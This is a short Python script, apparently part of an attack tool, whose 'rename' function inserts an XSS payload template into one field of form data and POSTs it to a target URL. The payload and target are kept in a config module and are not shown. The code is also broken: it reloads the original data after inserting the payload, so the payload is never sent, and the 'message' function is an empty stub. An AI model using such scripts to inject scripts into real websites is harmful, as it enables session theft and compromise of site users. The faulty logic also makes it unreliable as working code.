import requests
from config import XSS_PAYLOAD_TEMPLATE, TARGET_URL, get_base_headers
from helper import load_json_postData


def rename():
    postData = load_json_postData()
    postData[11] = XSS_PAYLOAD_TEMPLATE
    postData = "|".join(postData)
    postData = load_json_postData()
    headers = get_base_headers()
    urls = requests.post(url=TARGET_URL, data=postData, headers=headers)
    print(urls.content)

def message():
    pass    